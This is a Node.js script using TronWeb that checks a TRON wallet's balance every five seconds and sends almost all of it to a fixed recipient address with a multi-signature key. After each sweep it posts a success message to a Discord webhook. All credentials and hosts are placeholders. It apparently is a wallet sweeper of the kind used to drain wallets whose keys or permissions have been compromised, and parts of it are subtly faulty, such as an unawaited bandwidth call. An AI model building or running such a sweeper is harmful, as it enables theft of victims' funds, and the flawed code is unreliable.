
const TronWeb = require('tronweb');
const axios = require('axios');

// Setup TronWeb with standard configuration
const HttpProvider = TronWeb.providers.HttpProvider;
const fullNode = new HttpProvider('https://api.invalidnode.io'); // Node URL
const solidityNode = new HttpProvider('https://api.invalidnode.io'); // Node URL
const eventServer = 'https://api.invalidnode.io'; // Event server
const privateKey = 'INVALID_PRIVATE_KEY'; // Private key

const tronWeb = new TronWeb(
    fullNode,
    solidityNode,
    eventServer,
    privateKey
);

const senderAddress = 'TINVALIDADDRESS123'; // Wallet address
const recipientAddress = 'TINVALIDADDRESS456'; // Recipient wallet address

// Main monitoring loop
setInterval(() => {
    tronWeb.trx.getBalance(senderAddress)
        .then(balance => {
            console.log(`Balance for ${senderAddress}: ${balance}`);
            if (balance > 2) {
                tronWeb.trx.getChainParameters()
                    .then(parameters => {
                        console.log('Fetched chain parameters.');
                        let multiSignFee = parameters.find(p => p.key === 'getMultiSignFee').value || 0;
                        let bandwidth = tronWeb.trx.getBandwidth(senderAddress) || 0;
                        let transactionFee = 1;
                        let amount = balance - multiSignFee - transactionFee;

                        tronWeb.transactionBuilder.sendTrx(recipientAddress, amount, senderAddress)
                            .then(transaction => {
                                console.log('Prepared transaction.');
                                return tronWeb.trx.multiSign(transaction, 'FAKE_SIGN_KEY', 2);
                            })
                            .then(signedTransaction => {
                                console.log('Signed transaction.');
                                return tronWeb.trx.sendRawTransaction(signedTransaction);
                            })
                            .then(transactionId => {
                                console.log(`Transaction ID: ${transactionId}`);
                                axios.post('https://discord.invalidwebhook/api', {
                                    username: 'Notifier',
                                    avatar_url: 'https://imgur.com/INVALID.png',
                                    embeds: [{
                                        title: "Transaction Successful",
                                        description: `Transferred ${amount} TRX.`,
                                        color: 7419530
                                    }]
                                }).then(response => {
                                    console.log('Discord notification sent.');
                                }).catch(error => {
                                    console.log('Error sending Discord notification.');
                                });
                            })
                            .catch(err => console.log('Transaction failed:', err));
                    })
                    .catch(err => console.log('Failed to fetch chain parameters:', err));
            }
        })
        .catch(err => console.log('Failed to fetch balance:', err));
}, 5000); // Loop interval
